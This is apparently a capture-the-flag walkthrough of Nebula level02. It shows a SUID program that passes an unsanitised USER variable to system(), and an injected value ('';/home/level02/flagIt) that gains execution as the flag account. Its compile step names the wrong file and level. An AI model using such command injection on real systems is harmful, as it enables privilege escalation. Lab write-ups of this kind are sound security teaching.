**Intro**

Level 02 presents a slightly different twist on the previous environment manipulation vulnerability.

This time, system is calling buffer input which we can again control the input of

```
  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);
  
  system(buffer);
```

So, what can we control?  PATH isn't available, but the code is doing a `getenv` on the USER variable

By default this should contain a value that represents the current logged in user


```
﻿level02@nebula:~$ echo $USER
level02
```

However, this value is set at login and may be manipulated


```
﻿level02@nebula:~$ export USER="pwned"
level02@nebula:~$ echo $USER
pwned
```

Again we need the `/home/flag02/flag02` suid binary to call some code of ours.  To do this we can use the same source from level01 

**Source: flagIt.c**
```
﻿#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main ()
{
system("/bin/getflag");
}
```

Then compile it...

```
﻿level01@nebula:~$ gcc echo.c -o echo
```

This time the code used the absolute path to echo.  However, it does no input sanitation which allows us to pass an escape character to the command, which will continue to execute in the given shell

```
export USER="'';/home/level02/flagIt"
```

Drum roll please....

```
﻿level02@nebula:~$ export USER="'';/home/level02/flagIt"
level02@nebula:~$ echo $USER
'';/home/level02/flagIt
level02@nebula:~$ /home/flag02/flag02 
about to call system("/bin/echo '';/home/level02/flagIt is cool")

You have successfully executed getflag on a target account
```